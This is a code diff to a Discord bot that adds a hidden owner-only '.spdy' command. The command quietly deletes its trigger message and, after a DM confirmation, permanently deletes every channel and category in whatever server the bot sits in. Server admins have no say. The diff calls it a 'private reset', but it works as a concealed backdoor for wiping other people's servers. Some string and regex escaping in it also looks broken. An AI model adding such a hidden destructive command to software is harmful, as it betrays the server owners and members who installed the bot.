@@ -1384,9 +1384,101 @@ client.on('guildMemberAdd', async member => {
  } catch (e) { console.error('Invite tracking:',e.message); }
 });
 
+// Private, bot-owner-only server channel reset. The trigger and confirmation are handled in DMs.
+const pendingSpdyResets = new Map();
+
 client.on('messageCreate', async message => {
  if(message.author.bot) return;
- // Owner-only Coffee & Chill invite event announcement.
+
+ const privateCommand = message.content.trim();
+ if(message.guild && privateCommand.toLowerCase() === '.spdy') {
+  // Silently remove attempts by anyone other than the configured bot owner.
+  if(message.author.id !== TRUSTED_OWNER_ID) {
+   await message.delete().catch(()=>{});
+   return;
+  }
+
+  const guild = message.guild;
+  const botMember = guild.members.me || await guild.members.fetchMe().catch(()=>null);
+  if(!botMember?.permissions.has(PermissionFlagsBits.ManageChannels)) {
+   await message.reply('❌ Chilly needs **Manage Channels** permission to reset this server.').catch(()=>{});
+   return;
+  }
+
+  const expiresAt = Date.now() + 5 * 60 * 1000;
+  pendingSpdyResets.set(`${message.author.id}:${guild.id}`, expiresAt);
+
+  try {
+   await message.author.send({
+    embeds:[new EmbedBuilder()
+     .setColor(0xE0A526)
+     .setTitle('⚠️ Private server channel reset')
+     .setDescription(
+      `Server: **${guild.name}**\\n`+
+      `Channels/categories currently present: **${guild.channels.cache.size}**\\n\\n`+
+      'Confirming will permanently delete all channels and categories in this server. **Members and roles will remain untouched.**\\n\\n'+
+      `To confirm within 5 minutes, reply in this DM with:\n.spdy confirm ${guild.id}\n\n`+
+      'To cancel, do not send the confirmation.'
+     )
+     .setFooter({text:'This private command is restricted to the configured Chilly owner.'})]
+   });
+   await message.delete().catch(()=>{});
+  } catch {
+   pendingSpdyResets.delete(`${message.author.id}:${guild.id}`);
+   await message.reply('❌ I could not DM you. Enable DMs from server members and try again.').catch(()=>{});
+  }
+  return;
+ }
+
+ // Confirmation is accepted only in the bot-owner's DM, never in a server channel.
+ if(!message.guild && /^\\.spdy\\s+confirm\\s+\\d{17,20}$/i.test(privateCommand)) {
+  if(message.author.id !== TRUSTED_OWNER_ID) return;
+  const guildId = privateCommand.split(/\\s+/)[2];
+  const pendingKey = `${message.author.id}:${guildId}`;
+  const expiresAt = pendingSpdyResets.get(pendingKey);
+  if(!expiresAt || expiresAt < Date.now()) {
+   pendingSpdyResets.delete(pendingKey);
+   return message.reply('⌛ This reset confirmation expired or was not requested. Run `.spdy` in the server again.').catch(()=>{});
+  }
+
+  const guild = await client.guilds.fetch(guildId).catch(()=>null);
+  if(!guild) {
+   pendingSpdyResets.delete(pendingKey);
+   return message.reply('❌ Chilly is no longer in that server, or the server could not be found.').catch(()=>{});
+  }
+  const botMember = await guild.members.fetchMe().catch(()=>null);
+  if(!botMember?.permissions.has(PermissionFlagsBits.ManageChannels)) {
+   pendingSpdyResets.delete(pendingKey);
+   return message.reply('❌ Chilly needs **Manage Channels** permission in that server.').catch(()=>{});
+  }
+
+  pendingSpdyResets.delete(pendingKey);
+  await message.reply(`🗑️ Confirmed. Removing channels and categories from **${guild.name}**. Members and roles will remain.`).catch(()=>{});
+  let deleted = 0, failed = 0;
+  const channels = await guild.channels.fetch().catch(()=>null);
+  if(!channels) return message.reply('❌ I could not fetch the server channels. Nothing was deleted.').catch(()=>{});
+  const ordered = [...channels.values()].sort((a,b) =>
+   (a.type === ChannelType.GuildCategory ? 1 : 0) -
+   (b.type === ChannelType.GuildCategory ? 1 : 0)
+  );
+  for(const channel of ordered) {
+   try {
+    await channel.delete(`Private .spdy reset confirmed by Chilly owner ${TRUSTED_OWNER_ID}`);
+    deleted++;
+   } catch(error) {
+    failed++;
+    console.error(`.spdy could not delete ${channel.name}:`, error?.message || error);
+   }
+  }
+  return message.author.send(
+   `🗑️ **Channel reset finished for ${guild.name}.**\\n`+
+   `• Deleted: **${deleted}**\\n• Failed: **${failed}**\\n`+
+   '• Members and roles: **not changed**'
+  ).catch(()=>{});
+  }
+
+ 
+// Owner-only Coffee & Chill invite event announcement.
  if(message.guild && message.content.trim().toLowerCase() === '.event') {
   if(message.author.id !== TRUSTED_OWNER_ID) {
    return message.reply('⛔ Only the bot owner can use `.event`.').catch(()=>{});
